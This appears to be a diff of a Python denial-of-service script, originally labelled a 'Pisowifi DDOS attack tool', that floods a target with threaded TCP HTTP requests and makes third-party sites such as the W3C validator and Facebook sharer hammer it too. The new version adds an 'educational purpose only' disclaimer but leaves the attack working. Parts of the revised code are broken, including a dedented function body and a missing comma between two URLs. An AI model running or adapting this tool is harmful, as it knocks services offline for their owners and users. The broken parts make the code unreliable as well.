@@ -1,51 +1,36 @@
-#!/usr/bin/python3
-# -*- coding: utf-8 -*-
-
-#  Pisowifi DDOS attack tool.
-
+#  ⚠️ WARNING: DO NOT USE THIS SCRIPT ON PUBLIC NETWORKS OR SERVERS YOU DO NOT OWN
+#  Legal use is restricted to controlled environments with explicit permission.
 
 from queue import Queue
 from optparse import OptionParser
-import time,sys,socket,threading,logging,urllib.request,random
+import time, sys, socket, threading, logging, urllib.request, random
 
+# Rotating User-Agents
 def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)")
-	uagent.append("Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)")
-	uagent.append("Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
-	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
-	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
-	uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.72")
-	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5026.0 Safari/537.36 Edg/103.0.1254.0")
-	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32")
-	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15")
-	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15")
-	uagent.append("Mozilla/5.0 (X11; Linux i686; rv:97.0) Gecko/20100101 Firefox/97.0")
-	uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
-	uagent.append("Mozilla/5.0 (Android 12; Mobile; rv:97.0) Gecko/97.0 Firefox/97.0")
-	uagent.append("Mozilla/5.0 (X11; FreeBSD amd64; rv:87.0) Gecko/20100101 Firefox/87.0")
-	uagent.append("Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36")
-	uagent.append("Mozilla/5.0 (X11; CrOS aarch64 14526.89.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.133 Safari/537.36")
-	uagent.append("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39")
-	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0")
-	uagent.append("Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0")
-	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
-	uagent.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36")
-	uagent.append("Googlebot-Image/1.0")
-	return(uagent)
+    global uagent
+    uagent = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
+        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 Chrome/89.0.4389.72 Mobile Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 Safari/605.1.15",
+        "curl/7.68.0",
+        "Wget/1.20.3 (linux-gnu)"
+    ]
+    return uagent
 
-
+# Bot-like sources
 def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
+    global bots
+    bots = [
+        "http://validator.w3.org/check?uri=",
+        "http://www.facebook.com/sharer/sharer.php?u=",
+        "http://www.google.com/translate?u="
+        "http://archive.is/?url=",
+        "http://web.archive.org/save/"
+    ]
+    return bots
 
-
+# Simulated bot hammering
 def bot_hammering(url):
 	try:
 		while True:
@@ -54,129 +39,136 @@ def bot_hammering(url):
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
-
-
+# TCP flood with headers
 def down_it(item):
-	try:
-		while True:
-			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((host,int(port)))
-			if s.sendto( packet, (host, int(port)) ):
-				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Packet sent--> \033[0m")
-			else:
-				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
-			time.sleep(.1)
-	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
-		#print("\033[91m",e,"\033[0m")
-		time.sleep(.1)
+    try:
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((host, port))
+            packet = (
+                f"GET / HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"User-Agent: {random.choice(uagent)}\r\n"
+                f"Accept: */*\r\n"
+                f"Connection: keep-alive\r\n"
+                f"{data}\r\n\r\n"
+            ).encode('utf-8')
+            sock.send(packet)
+            print(f"\033[92m[Packet] Sent -> {host}:{port} @ {time.ctime()}\033[0m")
+            sock.shutdown(socket.SHUT_WR)
+            sock.close()
+            time.sleep(0.1)
+    except socket.error as e:
+        print(f"\033[91m[Error] Socket: {e}\033[0m")
+        time.sleep(0.5)
 
 
 def dos():
-	while True:
-		item = q.get()
-		down_it(item)
-		q.task_done()
+    while True:
+        item = q.get()
+        down_it(item)
+        q.task_done()
 
 
 def dos2():
-	while True:
-		item=w.get()
-		bot_hammering(random.choice(bots)+"http://"+host)
-		w.task_done()
+    while True:
+        item = w.get()
+        bot_hammering(random.choice(bots) + "http://" + host)
+        w.task_done()
 
-
+# Usage
 def usage():
-	print (''' \033[92m	
- Pisowifi DDOS attack tool
- 
-Misuse may result in severe legal penalties, including fines and imprisonment.
-Always obtain explicit permission before testing any system.
-By using this tool, you agree to comply with all applicable laws and assume full responsibility for your actions. \n
-	
- usage : python3 ddos.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
+    print(''' \033[92m
+Educational Purpose Only
+
+⚠️ Misuse may lead to legal penalties. Use only on systems you own or control./n
+Created By: ~HAXOR~
+
+
+
+Usage : python3 ddos.py [-s] [-p] [-t]
+    -h : help
+    -s : server IP address
+    -p : port (default: 80)
+    -t : turbo (threads, default: 135)
+\033[0m''')
+    sys.exit()
 
 
 def get_parameters():
-	global host
-	global port
-	global thr
-	global item
-	optp = OptionParser(add_help_option=False,epilog="Hammers")
-	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
-	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
-	if opts.host is not None:
-		host = opts.host
-	else:
-		usage()
-	if opts.port is None:
-		port = 80
-	else:
-		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
+global host
+global port
+global thr
+global item
+optp = OptionParser(add_help_option=False)
+optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
+optp.add_option("-s", "--server", dest="host", help="Target server IP")
+optp.add_option("-p", "--port", type="int", dest="port", help="Port (default 80)")
+optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Thread count (default 135)")
+optp.add_option("-h", "--help", dest="help", action='store_true', help="Show help")
+opts, args = optp.parse_args()
+
+    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
+    if opts.help:
+        usage()
+    if opts.host:
+        host = opts.host
+    else:
+        usage()
+    port = opts.port if opts.port else 80
+    thr = opts.turbo if opts.turbo else 135
 
 
-# reading headers
 global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-#task queue are q,w
-q = Queue()
-w = Queue()
+try:
+    with open("headers.txt", "r") as headers:
+        data = headers.read()
+except FileNotFoundError:
+    print("\033[91mMissing 'headers.txt'. Create it to define extra headers.\033[0m")
+    sys.exit()
 
 
 if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
-	user_agent()
-	my_bots()
-	time.sleep(5)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
-	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+    if len(sys.argv) < 2:
+        usage()
+    get_parameters()
+
+    print(f"\033[92m[Target] {host}:{port} | Threads: {thr}\033[0m")
+    print("\033[94m[!] Starting in 5 seconds...\033[0m")
+    user_agent()
+    my_bots()
+    time.sleep(5)
+
+
+    try:
+        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        test_sock.connect((host, port))
+        test_sock.settimeout(1)
+        test_sock.close()
+    except socket.error:
+        print("\033[91m[!] Connection failed. Check target.\033[0m")
+        usage()
+
+   
+    q = Queue()
+    w = Queue()
+
+    for i in range(thr):
+        t = threading.Thread(target=dos)
+        t.daemon = True
+        t.start()
+        t2 = threading.Thread(target=dos2)
+        t2.daemon = True
+        t2.start()
+
+    item = 0
+    while True:
+        if item > 1800:
+            item = 0
+            time.sleep(0.1)
+        item += 1
+        q.put(item)
+        w.put(item)
+    q.join()
+    w.join()
